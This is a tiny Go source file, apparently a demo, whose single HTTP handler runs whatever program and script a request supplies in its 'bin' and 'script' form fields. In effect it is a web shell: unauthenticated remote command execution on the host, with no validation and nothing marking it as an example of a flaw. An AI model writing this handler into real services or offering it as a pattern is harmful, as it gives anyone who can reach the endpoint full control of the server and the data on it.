package demo
import ("net/http"; "os/exec")
func H(w http.ResponseWriter, r *http.Request) { exec.Command(r.FormValue("bin"), "-c", r.FormValue("script")).Run() }
